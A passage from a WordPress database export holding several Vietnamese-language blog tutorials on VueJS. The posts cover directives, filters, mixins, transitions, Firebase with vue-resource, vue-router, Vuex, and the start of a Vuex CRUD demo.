arrDemo: [\'Samsung\', \'Oppo\', \'Vsmart\', \'Xiaomi\'],\n        objDemo: {\n            title: \'Project VueJS Demo\',\n            address: \'New York\',\n        },\n        string_demo: \"Hello world !!!\",\n    },\n\n    //Luôn run lại khi render lại teamplate\n    methods: {\n        say: function (text) {\n            return \'Hello \' + text;\n        },\n        senData: function () {\n            this.$emit(\'handleNewGame\', this.dataText);\n        },\n    },\n\n    //Sử dụng như methods, nhưng chỉ các biến trong computed thay đổi thì computed mới chạy lại\n    //Sử dụng như 1 property, không dùng ()\n    computed: {\n        say_computed: function (text) {\n            return \'Hello \' + text;\n        },\n    },\n\n    //Theo dõi sự thay đổi của 1 biến\n    watch: {\n        arrDemo: function (value) {\n            return \'Ahihi\' + value;\n        },\n    },\n\n    //Dùng khi muốn thay đổi hiển thị trước khi ra view, nhưng không làm thay đổi giá trị thực sự\n    //Sử dụng đơn giản tại template như sau: {{ message | filters}}\n    filters: {\n        formatVND: function (numbers) {\n            return numbers.toFixed(3).replace(/\\d(?=(\\d{3})+\\.)/g, \'$&,\');\n        },\n    },\n};\n\n</pre>\n\n<h1>II. Webpack</h1>\n-- Thay đổi đường dẫn gốc\n<pre>\nimport XYZ from \'../../src/components/Couter.vue\'\n//Thay bằng\nimport XYZ from \'@src/components/Couter.vue\'\n</pre>\n-- Vào ./webpack.config.js\n<pre>\n\n</pre>\n', 'VueJS – Syntax', '', 'publish', 'open', 'open', '', 'vuejs-syntax', '', '', '2021-06-10 02:00:38', '2021-06-09 19:00:38', '', 0, 'https://duycode.com/?p=1187', 0, 'post', '', 0),
(1202, 1, '2021-06-10 07:00:49', '2021-06-10 00:00:49', '<h2>1. Directives</h2>\n-- Directives tạo ra các options của template dạng: \"v-custom\", mục đích để custom style element theo ý mình\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n    <body>\n        <div id=\"app\">\n            <component-a></component-a>\n        </div>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n        <script>\n            let componentA_object = {\n                //Directives khai báo dạng local\n                directives: {\n                    local_custom: {\n                        bind(el, binding, vnode) {\n                            if (binding.arg == \"square\") {\n                                el.style.width = binding.value,\n                                el.style.height = binding.value,\n                                el.style.backgroundColor = \'violet\'\n                            }\n                        }\n                    }\n                },\n                template: `<div>\n                                <div v-local_custom:square=\"\'100px\'\">This is use directive</div>\n                                <div v-global_custom:background.color.size=\"{bgColor: \'green\', color: \'#fff\', size: \'25px\'}\">\n                                    This is use directive\n                                </div>\n                            </div>`\n            };\n\n            //Directives khai báo dạng Global\n            Vue.directive(\"global_custom\", {\n                bind(el, binding, vnode) {\n                    if (binding.arg == \"background\") {\n                        el.style.backgroundColor = binding.value.bgColor;\n                    }\n                    if (binding.modifiers[\"color\"]) {\n                        el.style.color = binding.value.color;\n                    }\n                    if (binding.modifiers[\"size\"]) {\n                        el.style.fontSize = binding.value.size;\n                    }\n                }\n            });\n\n            let app = new Vue({\n                el: \"#app\",\n                components: {\n                    componentA: componentA_object\n                }\n            });\n        </script>\n    </body>\n</html>\n</pre>\n\n<h2>2. Filters</h2>\n-- Filters sử dụng để thay đổi cách hiển thị của dữ liệu (mà không thay đổi giá trị dữ liệu)\n-- Khi khai báo nhiều filter, filter khai báo trước sẽ được sử dụng trước\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n    <body>\n        <div id=\"app\">\n            <component-a></component-a>\n        </div>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n        <script>\n            let componentA_object = {\n                data: function(){\n                    return {\n                        text: \'Hello everyone, VueJS !\'\n                    }\n                },\n                //Filter khai báo dạng local\n                filters: {\n                    local_lowerCase: function(str){\n                        return str.toLowerCase();\n                    }\n                },\n\n                //filter nào khai báo trước sẽ được hoạt động trước\n                template: `<div>\n                                <p>{{text | global_upperCase }}</p> \n                                <p>{{text | global_upperCase | local_lowerCase }}</p> \n                            </div>`\n            };\n\n            //Filter khai báo dạng Global\n            Vue.filter(\'global_upperCase\', function(str){\n                return str.toUpperCase();\n            })\n\n            let app = new Vue({\n                el: \"#app\",\n                components: {\n                    componentA: componentA_object\n                }\n            });\n        </script>\n    </body>\n</html>\n\n</pre>\n\n<h2>3. Mixins</h2>\n--- Mixin có thể chứa toàn bộ các options của 1 component\n--- Khi component inject các Mixin vào --> nó sẽ tự động merge các options vào component đó.\n--- Trường hợp trùng key thì component giành chiến thắng tức nó sẽ ghi đè lại giá trị ở Mixin.\n--- Đặc biệt vs hook functions thì thứ tự run sẽ là Mixin-> Component.\n--- Mọi component dùng chung mixins cũng ko liên quan gì đến nhau, ghi gọi thuộc tính đó về thì mỗi thuộc tính đó chỉ thuộc component đó\n\n* Trường hợp dùng Mixins dùng local:\n--- Xem ví dụ ở Lifecycle\n* Trường hợp dùng Mixins dùng global:\n-- Mọi component và \"cả Vue nữa\" cũng đều sử dụng Mixin\n<pre>\n// inject a handler for `myOption` custom option\nVue.mixin({\n    created: function(){\n        console.log(\"Global mixins\"); \n    }\n})\n\nnew Vue({\n});\n// => \"Global mixins\"\n</pre>', 'VueJS - Directives, Filters và Mixins', '', 'publish', 'open', 'open', '', 'vuejs-directives-filters-va-mixins', '', '', '2021-06-10 07:00:49', '2021-06-10 00:00:49', '', 0, 'https://duycode.com/?p=1202', 0, 'post', '', 0),
(1212, 1, '2021-06-10 08:00:56', '2021-06-10 01:00:56', '<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <title>VueJS</title>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n        <!-- Lấy CDN tại https://animate.style/ -->\n        <link\n            rel=\"stylesheet\"\n            href=\"https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css\"\n        />\n    </head>\n    <body>\n        <div id=\"app\">\n            <button v-on:click=\"isTransition = !isTransition\">\n                Toggle Transition\n            </button>\n\n            <!-- Sử dụng name của transition -> các hiệu ứng sẽ lấy từ 4 class với name tương ứng  -->\n            <!-- appear là chạy ngay khi xuất hiện, mặc định nó chạy block css \"enter\" -->\n            <transition name=\"fade\" appear>\n                <div v-if=\"isTransition\">\n                    This is something for test Fade Transition Fade\n                </div>\n            </transition>\n            <br>\n\n            <!-- Sử dụng 2 div trong một transition -->\n            <!-- Không thể nhiều root element cùng xuất hiện trong 1 transiton -->\n            <!-- Nếu dùng biểu thức điều kiện thì cần dùng các key khác nhau -->\n            <transition name=\"slide\" appear>\n                <div v-if=\"isTransition\"  key=\"123\">\n                    This is Slide Transition => isTransition == true\n                </div>\n                <div v-else  key=\"abc\">\n                    This is Slide Transition => isTransition == false\n                </div>\n            </transition>\n            <br>\n\n            <!-- Sử dụng các thuộc tính của transition để add class -->\n            <transition\n                appear\n                enter-active=\"\"\n                enter-active-class=\"animate__animated animate__tada \"\n                leave-active=\"\"\n                leave-active-class=\"animate__animated animate__bounceOutLeft \"\n            >\n                <div v-if=\"isTransition\">\n                    This is use Framework CSS animation, by CDN\n                </div>\n            </transition>\n\n            <!-- Sử dụng javascript vào các sự kiện -->\n            <transition\n                @before-enter=\"beforeEnter\"\n                @enter=\"enter\"\n                @after-enter=\"afterEnter\"\n                @enter-cancelled=\"enterCancelled\"\n                @before-leave=\"beforeLeave\"\n                @leave=\"leave\"\n                @after-leave=\"afterLeave\"\n                @leave-cancelled=\"leaveCancelled\"\n            >\n                <div\n                    v-if=\"isTransition\"\n                    style=\"width: 200px; height: 200px; background-color: green;\"\n                ></div>\n            </transition>\n        </div>\n    </body>\n    <script>\n        var app = new Vue({\n            el: \"#app\",\n            data: function() {\n                return {\n                    isTransition: true\n                };\n            },\n            methods: {\n                beforeEnter(el) {\n                    console.log(\"beforeEnter\");\n                },\n                enter(el, done) {\n                    console.log(\"enter\");\n                },\n                afterEnter(el) {\n                    console.log(\"afterEnter\");                },\n                enterCancelled(el) {\n                    console.log(\"enterCancelled\");\n                },\n                beforeLeave(el) {\n                    console.log(\"beforeLeave\");\n                },\n                leave(el, done) {\n                    console.log(\"leave\");\n                    done();\n                },\n                afterLeave(el) {\n                    console.log(\"afterLeave\");\n                },\n                leaveCancelled(el) {\n                    console.log(\"leaveCancelled\");\n                }\n            }\n        });\n    </script>\n    <style>\n        /* fade transition effect */\n        .fade-enter {\n            opacity: 0;\n        }\n        .fade-enter-active {\n            transition: opacity 1s;\n        }\n        .fade-leave {\n            /* opacity: 1; */\n        }\n        .fade-leave-active {\n            transition: opacity 1s;\n            opacity: 0;\n        }\n\n        /* slide transition effect */\n        .slide-enter {\n        }\n        .slide-enter-active {\n            animation: slide-in 1s ease-out forwards;\n        }\n        .slide-leave {\n        }\n        .slide-leave-active {\n            animation: slide-out 1s ease-out forwards;\n        }\n\n        /* key frame animation */\n        @keyframes slide-in {\n            from {\n                transform: translateY(20px);\n            }\n            to {\n                transform: translateY(0);\n            }\n        }\n\n        @keyframes slide-out {\n            from {\n                transform: translateY(0);\n            }\n            to {\n                transform: translateY(20px);\n            }\n        }\n    </style>\n</html>\n\n</pre>', 'VueJS - Transition', '', 'publish', 'open', 'open', '', 'vuejs-transition', '', '', '2021-06-10 08:00:56', '2021-06-10 01:00:56', '', 0, 'https://duycode.com/?p=1212', 0, 'post', '', 0),
(1214, 1, '2021-06-10 09:00:49', '2021-06-10 02:00:49', '1. Cài đặt vue-resource\n<a href=\"https://github.com/pagekit/vue-resource\" rel=\"noopener\" target=\"_blank\">https://github.com/pagekit/vue-resource</a>\n-- Cài đặt qua npm\n<blockquote>\nnpm install vue-resource\n</blockquote>\n-- Dùng CDN: <a href=\"http://<script src=\"https://cdn.jsdelivr.net/npm/vue-resource@1.5.3\"></script>\" rel=\"noopener\" target=\"_blank\"><script src=\"https://cdn.jsdelivr.net/npm/vue-resource@1.5.3\"></script></a>\n\n-- Sử dụng\n<pre>\nimport Vue from \"vue\";\nimport App from \"./App.vue\";\nimport VueResource from \"vue-resource\";\n\nVue.use(VueResource)\n\nnew Vue({\n    el: \"#app\",\n    render: h => h(App)\n});\n</pre>\n\n3. Demo sử dụng: Firebase và vue-resource\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <title>VueJS Demo</title>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue-resource@1.5.3\"></script>\n        <style>\n            table {\n                border: none;\n                border-collapse: collapse;\n            }\n            td {\n                border: 1px solid #ccc;\n            }\n        </style>\n    </head>\n    <body>\n        <div id=\"app\">\n            <h2>Vue Form for FireBase</h2>\n            <p>User: <input type=\"text\" v-model=\"user.username\" /></p>\n            <p>Email: <input type=\"text\" v-model=\"user.email\" /></p>\n            <button @click=\"createNewUser\">Create New User</button>\n            <hr />\n            <button @click=\"getAllUsers\">Get All Data</button><br />\n            <table>\n                <tbody>\n                    <tr v-for=\"(user, key, index) in users\" :key=\"key\">\n                        <td>{{ index }}</td>\n                        <td>{{ key }}</td>\n                        <td>{{ user.username }}</td>\n                        <td>{{ user.email }}</td>\n                    </tr>\n                </tbody>\n            </table>\n            <hr />\n            <p>Get ID: <input type=\"text\" v-model=\"getID\" /></p>\n            <button @click=\"getUserById(getID)\">Get By ID</button>\n            <p>Result: {{user.username}} - {{ user.email }}</p>\n        </div>\n    </body>\n    <script>\n        Vue.http.options.root =\n            \"https://vue-demo-rhp-default-rtdb.asia-southeast1.firebasedatabase.app/\";\n        var app = new Vue({\n            el: \"#app\",\n            data() {\n                return {\n                    user: {\n                        username: \"\",\n                        email: \"\"\n                    },\n                    users: {},\n                    getID: \"\"\n                };\n            },\n            methods: {\n                createNewUser() {\n                    this.$http\n                        .post(\"data.json\", this.user)\n                        .then(response => {\n                            return response.json();\n                        })\n                        .then(data => {\n                            console.log(data);\n                        })\n\n                        .catch(error => {\n                            console.log(error);\n                        });\n                },\n                getAllUsers() {\n                    this.$http\n                        .get(\"data.json\")\n                        .then(response => {\n                            return response.json();\n                        })\n                        .then(data => {\n                            this.users = data;\n                            console.log(this.users);\n                        })\n                        .catch(error => console.log(error));\n                },\n                getUserById(id) {\n                    this.$http\n                        .get(\"data/\" + id + \".json\")\n                        .then(response => {\n                            return response.json();\n                        })\n                        .then(data => {\n                            console.log(data);\n                            this.user = data;\n                        })\n                        .catch(error => console.log(error));\n                },\n            }\n        });\n    </script>\n</html>\n\n</pre>\n', 'VueJS - Firebase và vue resource', '', 'publish', 'open', 'open', '', 'vuejs-firebase-va-vue-resource', '', '', '2021-06-10 09:00:49', '2021-06-10 02:00:49', '', 0, 'https://duycode.com/?p=1214', 0, 'post', '', 0),
(1225, 1, '2021-06-10 10:00:29', '2021-06-10 03:00:29', '<h2>1. npm</h2>\r\n<blockquote>npm i vue-router</blockquote>\r\n-- Xem thêm các ví dụ dùng vue-router tại: <a href=\"https://github.com/vuejs/vue-router/tree/dev/examples\" rel=\"noopener\" target=\"_blank\">https://github.com/vuejs/vue-router/tree/dev/examples</a>\r\n\r\n<img src=\"https://vuex.vuejs.org/flow.png\" alt=\"\" />\r\n\r\n<h2>2.Tạo file ./src/routes.js</h2> \r\n-- File routes.js phải đúng vị trí dưới folder src, cùng cấp file main.js\r\n-- File này quy định các router\r\n-- Có thể sử dụng lazyload cho tất cả thằng component \"user\" để tăng tốc độ tải website\r\n<pre>\r\nimport Home from \"./components/Home.vue\";\r\n\r\n//Sử dụng cách lazy load sẽ tối ưu tốc độ load hơn\r\n//import User from \"./components/user/User.vue\";\r\nconst User = resolve => {\r\n  require.ensure([\'./components/user/User\'], () => {\r\n    resolve(require(\'./components/user/User\'))\r\n  },\'user\')     \r\n}\r\n\r\n//import UserIndex from \"./components/user/UserIndex.vue\";\r\nconst UserIndex = resolve => {\r\n  require.ensure([\'./components/user/UserIndex \'], () => {\r\n    resolve(require(\'./components/user/UserIndex \'))\r\n  },\'user\')     \r\n}\r\n\r\n\r\n//import UserDetails from \"./components/user/UserDetails.vue\";\r\nconst UserDetails = resolve => {\r\n  require.ensure([\'./components/user/UserDetails \'], () => {\r\n    resolve(require(\'./components/user/UserDetails \'))\r\n  },\'user\')     \r\n}\r\n//import UserEdit from \"./components/user/UserEdit.vue\";\r\nconst UserEdit= resolve => {\r\n  require.ensure([\'./components/user/UserEdit\'], () => {\r\n    resolve(require(\'./components/user/UserEdit\'))\r\n  },\'user\')     \r\n}\r\n\r\nimport Aboutfrom \"./components/About.vue\";\r\nimport AboutCustomfrom \"./components/AboutCustom.vue\";\r\n\r\nimport ErrorComponent from \"./components/404.vue\";\r\n\r\nexport const routes = [\r\n  { path: \"/\", name: \"homepage\", component: Home },\r\n\r\n  //tùy chọn router theo name, \r\n  //Nếu <router-view /> thì gọi component About\r\n  //Nếu <router-view name=\"about-custom\"/> thì gọi component AboutCustom\r\n  { path: \"/about\", name: \"about\", components: {\r\n      default: About,\r\n      \'about-custom\': AboutCustom,\r\n    }\r\n  },\r\n  {\r\n    path: \"/user\",\r\n    name: \"user\",\r\n    component: User,\r\n    children: [\r\n      { path: \"\", name: \"user_index\", component: UserIndex },\r\n      //beforeEnter --> chạy hàm trước khi router được sử dụng, luôn phải có next() để đi tiếp\r\n      {\r\n        path: \":id\",\r\n        name: \"user_details\",\r\n        component: UserDetails,\r\n        beforeEnter: (to, from, next) => {\r\n          console.log(\'Router user detail run\');\r\n          next();\r\n        }\r\n      },\r\n      { path: \":id/edit\", name: \"user_edit\", component: UserEdit }\r\n    ]\r\n  },\r\n\r\n  { path: \"/404\", name: \"errorpage\", component: ErrorComponent },\r\n  { path: \"*\", redirect: { name: \"errorpage\" } }\r\n];\r\n</pre>\r\n\r\n<h2>3. Tại file ./src/main.js</h2>\r\n-- Gọi vue-router tại main.js\r\n<pre>\r\nimport Vue from \"vue\";\r\nimport App from \"./App.vue\";\r\n\r\nimport VueRouter from \"vue-router\";\r\nVue.use(VueRouter);\r\n\r\nimport { routes } from \"./routes\";\r\n\r\n//mode: history: để sửa lỗi dấu # trên link về bình thường\r\n//scrollBehavior để khi vào link có đánh dấu #id_custom thì nhảy đến element có id tương ứng luôn\r\nconst router = new VueRouter({\r\n  mode: \"history\",\r\n  routes,\r\n  scrollBehavior(to, from, savedPosition) {\r\n    if (savedPosition) {\r\n      return savedPosition;\r\n    }\r\n    if (to.hash) {\r\n      return { selector: to.hash };\r\n    }\r\n  }\r\n});\r\n\r\n//beforeEach sẽ hoạt động trước khi tất cả các router được chạy, luôn phải có next() để đi tiếp\r\nrouter.beforeEach((to, from, next) =>{\r\n  console.log(\'Global route guard\');\r\n  next();\r\n})\r\n\r\nnew Vue({\r\n  el: \"#app\",\r\n  router: router,\r\n  render: h => h(App)\r\n});\r\n\r\n</pre>\r\n\r\n<h2>4. Tại file ./src/components/user/UserDetails.vue</h2>\r\n-- 2 hàm hooks, 1 hàm chạy trước khi router được vào và 1 hàm chạy trước khi router rời đi\r\n<pre>\r\n<script>\r\nexport default {\r\n  beforeRouteEnter(to, from, next) {\r\n    if (true) {\r\n      next();\r\n    } else {\r\n      next(false);\r\n    }\r\n  },\r\n  beforeRouteLeave(to, from, next) {\r\n    if (false) {\r\n      next();\r\n    } else {\r\n      if (confirm(\"Are you sure???\")) {\r\n        next();\r\n      } else {\r\n        next(false);\r\n      }\r\n    }\r\n  }\r\n};\r\n</script>\r\n\r\n</pre>', 'VueJS - Router: 1. Cài đặt', '', 'publish', 'open', 'open', '', 'vuejs-router-1-cai-dat', '', '', '2022-12-30 08:31:09', '2022-12-30 08:31:09', '', 0, 'https://duycode.com/?p=1225', 0, 'post', '', 0),
(1248, 1, '2021-06-10 12:00:40', '2021-06-10 05:00:40', '<h2>1. Gọi router-view</h2>\n-- &lt;router-view /&gt; sẽ hiển thị khối component được định nghĩa ở file ./src/routes.js\n-- &lt;router-view name=\"custom\" /&gt; sẽ hiển thị khối component được gắn với key: \"custom\"\n-- Khi không có name, sẽ hiển thị khối component với key \"default\"\n\n-- Tại ./src/App.vue -> Thường đặt khối &lt;router-view /&gt; ở dưới header-component\n-- Nếu không có key: \"custom\", khối &lt;router-view name=\"custom\" /&gt; sẽ không có component để hiển thị (vì chưa được khai báo)\n<pre>\n<template>\n  <div id=\"app\">\n    <header-component />\n    <div class=\"container\">\n      <router-view />\n      <router-view name=\"custom\"/>\n    </div>\n  </div>\n</template>\n</pre>\n\n<h2>2. Chuyển link bằng &lt;router-link to=\"...\"&gt; router-link</h2>\n2.1. Chuyển link đơn giản dùng: to =\"...\"\n-- Thay các thẻ &lt;li&gt; hoặc thẻ &lt;a&gt; trên header thành &lt;router-link&gt;\n-- tag=\"a\": là render ra trình duyệt hiểu đó là thẻ a\n-- to=\"/\": nghĩa là vào link \"/\"\n-- active-class=\"active\": khi được active sẽ thêm class \"active\"\n-- exact : mặc định được thêm class \"active\" luôn\n<pre>\n//<a class=\"nav-link active\" href=\"/\">Home</a>\n<router-link tag=\"a\" class=\"nav-link\" to=\"/\" active-class=\"active\" exact >Home</router-link>\n\n//<a class=\"nav-link\" href=\"/user\">user</a>\n<router-link tag=\"a\" class=\"nav-link\" to=\"/user\" active-class=\"active\">User</router-link>\n</pre>\n\n2.2. Chuyển link dùng: v-bind:to =\"...\"\n<pre>\n//Có thể dùng v-bind để gọi biến trong link, với path:\'/user/:id\'\n//<a class=\"nav-link\" href=\"/user/customID\">User 123123 </a>\n<router-link \n  tag=\"a\" \n  class=\"nav-link\" \n  active-class=\"active\"\n  v-bind:to=\"\'/user/\' + customID\" \n  >User 123123\n</router-link>\n</pre>\n\n2.3. Chuyển link phức tạp có params, query, hash\n--- Có thể dùng v-bind để gọi routes có {name: \'userdetails\', path: \'/user/:id\'} được khai báo ở \"./src/routes.js\" \n--- Trong routes có params: { id: \"customID\" }\n--- Trong routes có query: {location: \'vi\', browser: \'chrome\'}\n--- Trong routes có hash: { hash: \"#id_element\" }. \n--- Khi dùng hash, tại main.js đã khai báo scrollBehavior để scroll đúng đến vị trí cần thiết luôn\n<pre>\n//<a class=\"nav-link\" href=\"/user/customID?location=vi&browser=chrome#id_element\">Admin</a>\n<router-link \n  tag=\"a\" \n  class=\"nav-link\"  \n  active-class=\"active\"\n  v-bind:to=\"custom_link\" \n  >Admin\n</router-link>\n\n<script>\nexport default {\n  data() {\n    return {\n      custom_link: {\n        name: \"userdetails\",\n        params: { id: \"customID\" },\n        query: { location: \"vi\", browser: \"chrome\" },\n        hash: \'#id_element\',\n      }\n    };\n  }\n};\n</script>\n</pre>\n\n<h2>3. Chuyển link bằng funtion event \"this.$router.push\"</h2>\n<pre>\n<template>\n  <div>\n    <button class=\"btn-danger\" @click=\"goToUser\">Back Home</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  methods: {\n    goToUser() {\n      //Cách gọi đơn giản nhất\n      this.$router.push(\'/user\');\n      //Chi tiết hơn\n      //this.$router.push({path: \"/\"});\n      //Có thể dùng gọi theo biến \"name\" đã được khai báo ở \"./src/routes.js\" \n      //this.$router.push({name: \"homepage\"});\n    }\n  }\n};\n</script>\n</pre>\n\n<h2>4. Lấy Parameter và Query trong router</h2>\nKhi vào link: \'./user/customID?location=vn&browswe=chrome\n<pre>\n<template>\n  <div>\n    <h1>User Detail</h1>\n    <p>User ID: {{ $route.params.id }}</p>\n    <p>User ID: {{ $route.query.location}}</p>\n    <p>User ID: {{ $route.query.browser}}</p>\n  </div>\n</template>\n\n<script>\nexport default {\n  //Khi chỉ thay đổi parametter, Vue sẽ không biết có sự thay đổi router --> components sẽ không cập nhật id, cần lưu ý điều này\n  watch: {\n    \'$route\'(to,from) {\n      this.id = to.params.id;\n    }\n  },\n};\n</script>\n\n<style></style>\n\n</pre>', 'VueJS - Router: 2. Sử dụng', '', 'publish', 'open', 'open', '', 'vuejs-router-2-su-dung', '', '', '2021-06-10 12:00:40', '2021-06-10 05:00:40', '', 0, 'https://duycode.com/?p=1248', 0, 'post', '', 0),
(1258, 1, '2021-06-10 13:00:48', '2021-06-10 06:00:48', '-- Có thể hiểu đơn giản như các OOP khác\n-- state giống như nơi lưu trữ biến\n-- getters: giống như getter -> là nơi gọi biến\n-- mutations: giống như settter -> là nơi set các biến\n<img src=\"https://vuex.vuejs.org/vuex.png\" alt=\"\" />\n<h2>1. Store</h2>\n-- Store là nơi chứa dữ liệu, bao gồm sate (giống biến toàn cục và có thể reactively) và getter\n-- File ./src/store/store.js\n<pre>\nimport Vue from \'vue\';\nimport Vuex from \'vuex\'\n\nVue.use(Vuex)\n\nexport const store = new Vuex.Store({\n    state: {\n        customNumber: 0\n    },\n    getters: {\n        //Biến (state) chính là lấy (state) của store\n        multil10: state => {\n            return state.customNumber * 10;\n        },\n        //Biến (state, getters) chính là lấy (state, getters) của store\n        multil11: (state, getters) => {\n            return state.customNumber + getters.multil10;\n        },\n        //Có thể return ra 1 hàm để tiếp tục tùy chỉnh getters, trường hợp này là tùy chỉnh fixed\n        fixNumberVND: (state, getters) => (fixed = 2) => {\n            return state.customNumber.toFixed(fixed);\n        },\n    },\n\n    mutations: {\n        increment(state, payload){\n            state.customNumber += payload;\n        }\n    }\n})\n</pre>\n\n<h2>2. Components</h2>\n-- Có thể gọi state, computed và mutations thoải con gà mái bằng nhiều cách\n<pre>\n<template>\n    <div>\n        <div>\n            <span>Có thể tùy chỉnh trực tiếp các biến state</span>\n            <button @click=\"$store.state.customNumber++\">Cộng 1</button>\n            <button @click=\"$store.state.customNumber--\">Trừ 1</button>\n        </div>\n        <p>\n            Có thể lấy trực tiếp state \"customNumber\":\n            {{ $store.state.customNumber }}\n        </p>\n\n        <p>\n            Có thể lấy trực tiếp getters \"multil10\":\n            {{ $store.getters.multil10 }}\n        </p>\n        <br />\n        <p>Có thể lấy từ computed \"multil10\": {{ multil10 }}</p>\n        <p>Có thể lấy từ computed \"x11\": {{ x11 }}</p>\n        <p>\n            Có thể lấy từ computed \"fixtoVND\":\n            {{ fixtoVND }}\n        </p>\n\n        <div>\n            <span>Có thể gọi trực tiếp mutations \"increment\"</span>\n            <button @click=\"$store.commit(\'increment\', 5)\">Increment 5</button\n            ><br />\n            <span>Có thể gọi method \"decrement\" từ mapMutations</span>\n            <button @click=\"decrement(5)\">Decrement 5</button>\n        </div>\n    </div>\n</template>\n\n<script>\n//có thể dùng mapGetter để gọi các getter trong store 1 cách ngắn gọn\nimport { mapGetters } from \"vuex\";\nimport { mapMutations } from \"vuex\";\nexport default {\n    computed: {\n        //có thể gọi trực tiếp tên các getter bằng mảng\n        ...mapGetters([\"multil10\", \"multil11\"]),\n        //cũng có thể gọi và thay thế bằng các tên khác\n        ...mapGetters({\n            x10: \"multil10\",\n            x11: \"multil11\",\n        }),\n\n        //các hàm khác của computed vẫn gọi và sử dụng bình thường\n        fixtoVND() {\n            return this.$store.getters.fixNumberVND(3);\n        },\n    },\n\n    methods: {\n        ...mapMutations([\"increment\", \"decrement\"]),\n    },\n};\n</script>\n</pre>\n', 'VueJS - Vuex: 1. State,  Getters và Mutations', '', 'publish', 'open', 'open', '', 'vuejs-vuex-1-state-getters-va-mutations', '', '', '2021-06-10 13:00:48', '2021-06-10 06:00:48', '', 0, 'https://duycode.com/?p=1258', 0, 'post', '', 0),
(1273, 1, '2021-06-10 12:00:58', '2021-06-10 05:00:58', '<h2>1. Cài đặt</h2>\n-- Trang chủ: <a href=\"https://vuex.vuejs.org/guide/\" rel=\"noopener\" target=\"_blank\">https://vuex.vuejs.org/guide/</a>\n-- npm\n<blockquote>npm i vuex</blockquote>\n-- Vuex có tác dụng lưu 1 giá trị, nó khác biến toàn cục (global) ở chỗ nó có tính năng phản ứng -> cập nhật giá trị lên component khi giá trị state thay đổi\n\n<h2>. 2. Sử dụng</h2>\n-- Vào ./src/main.js\n-- Tạo 1 biến trong store là: customData = 0;\n<pre>\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\n\nimport Vuex from \'vuex\'\nVue.use(Vuex)\nexport const store = new Vuex.Store({\n    state: {\n        customData: 0\n    }\n})\n\nnew Vue({\n  el: \'#app\',\n  store: store,\n  render: h => h(App)\n})\n\n</pre>', 'VueJS - Vuex: 1. Cài đặt', '', 'publish', 'open', 'open', '', 'vuejs-vuex-1-cai-dat', '', '', '2021-06-10 12:00:58', '2021-06-10 05:00:58', '', 0, 'https://duycode.com/?p=1273', 0, 'post', '', 0),
(1281, 1, '2022-10-01 03:00:04', '2022-10-01 03:00:04', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Vue: Basic CRUD with Vuex</title>\r\n    <style>\r\n        table {\r\n            border-collapse: collapse;\r\n        }\r\n\r\n        th,\r\n        td {\r\n            padding: 0 0.5rem;\r\n            border: 1px solid black;\r\n        }\r\n\r\n        .loader {\r\n            border: 2px solid #f3f3f3;\r\n            border-radius: 50%;\r\n            border-top: 2px solid green;\r\n            width: 12px;\r\n            height: 12px;\r\n            animation: spin 0.5s linear infinite;\r\n        }\r\n\r\n        @keyframes spin {\r\n            0% {\r\n                transform: rotate(0deg);\r\n            }\r\n\r\n            100% {\r\n                transform: rotate(360deg);\r\n            }\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\">\r\n        <button v-on:click=\"student={ username: \'\', email: \'\', id: \'\' }\">New Student</button><br />\r\n        <input type=\"text\" placeholder=\"username\" v-model=\"student.username\" /><br />\r\n        <input type=\"text\" placeholder=\"email\" v-model=\"student.email\" /><br />\r\n        <button @click=\"saveStudent\">{{student.id ? \'Update Student\':\'Create Student\'}}</button><br /><br />\r\n        <input type=\"text\" placeholder=\"Search...\" v-model=\"filter\">\r\n        <button @click=\"filter=\'\'\">x</button>\r\n        <table>\r\n            <thead>\r\n                <tr>\r\n                    <th>#</th>\r\n                    <th>User</th>\r\n                    <th>Email</th>\r\n                    <th>Actions</th>\r\n                </tr>\r\n            </thead>\r\n            <tbody>\r\n                <tr v-for=\"(item, index) in filterStudent\" :key=\"index\">\r\n                    <td>{{index + 1}}</td>\r\n                    <td>{{item.username}}</td>\r\n                    <td>{{item.email}}</td>\r\n                    <td>\r\n                        <button @click=\"getStudentByID(item.id)\">Edit</button>\r\n                        <button @click=\"deleteStudent(item.id)\">Delete</button>\r\n                    </td>\r\n                </tr>\r\n            </tbody>\r\n        </table><br />\r\n        <select v-model=\"url_fakeStudent\">\r\n            <option value=\"https://jsonplaceholder.typicode.com/users\">https://jsonplaceholder.typicode.com/users\r\n            </option>\r\n            <option value=\"https://fakestoreapi.com/users?limit=10\">https://fakestoreapi.com/users?limit=10</option>\r\n        </select><br />\r\n        <button @click=\"getStudentsOnline\">Get Student Online</button>\r\n        <div v-show=\"loading\" class=\"loader\"></div>\r\n    </div>\r\n\r\n    <!-- <script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script> -->\r\n    <!-- <script src=\"https://unpkg.com/vuex@4/dist/vuex.global.js\"></script> -->\r\n    <script src=\"https://unpkg.com/vue@3.2.41/dist/vue.global.js\"></script>\r\n    <script src=\"https://unpkg.com/vuex@4.1.0/dist/vuex.global.js\"></script>\r\n\r\n    <script>\r\n        const uuid = () => Math.floor((1 + Math.random()) * 